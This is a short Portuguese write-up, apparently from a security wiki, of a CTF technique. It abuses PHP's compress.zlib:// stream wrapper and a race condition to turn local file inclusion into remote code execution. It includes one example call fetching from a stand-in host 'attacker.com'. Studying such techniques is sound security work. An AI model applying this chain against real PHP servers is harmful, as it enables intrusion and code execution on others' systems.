## `compress.zlib://` e `PHP_STREAM_PREFER_STDIO`

Um arquivo aberto usando o protocolo `compress.zlib://` com a flag `PHP_STREAM_PREFER_STDIO` pode continuar escrevendo dados que chegam à conexão posteriormente no mesmo arquivo.

Isso significa que uma chamada como:
```php
file_get_contents("compress.zlib://http://attacker.com/file")
```
Você enviará uma solicitação pedindo http://attacker.com/file, então o servidor pode responder à solicitação com uma resposta HTTP válida, manter a conexão aberta e enviar dados extras algum tempo depois que também serão gravados no arquivo.

Você pode ver essa informação nesta parte do código php-src em main/streams/cast.c:
```c
/* Use a tmpfile and copy the old streams contents into it */

    if (flags & PHP_STREAM_PREFER_STDIO) {
        *newstream = php_stream_fopen_tmpfile();
    } else {
        *newstream = php_stream_temp_new();
    }
```
## Condição de Corrida para RCE

Este CTF foi resolvido usando o truque anterior.

O atacante fará com que o servidor da vítima abra uma conexão lendo um arquivo do servidor do atacante usando o protocolo `compress.zlib`.

Enquanto essa conexão existir, o atacante exfiltrará o caminho para o arquivo temporário criado (que é vazado pelo servidor).

Enquanto a conexão ainda estiver aberta, o atacante explorará uma LFI carregando o arquivo temporário que ele controla.

No entanto, há uma verificação no servidor web que impede o carregamento de arquivos que contêm `<?`. Portanto, o atacante abusará de uma Condição de Corrida. Na conexão que ainda está aberta, o atacante enviará a carga útil PHP DEPOIS que o servidor web verificou se o arquivo contém os caracteres proibidos, mas ANTES de carregar seu conteúdo.

Para mais informações, verifique a descrição da Condição de Corrida e do CTF em [https://balsn.tw/ctf\_writeup/20191228-hxp36c3ctf/#includer](https://balsn.tw/ctf\_writeup/20191228-hxp36c3ctf/#includer)
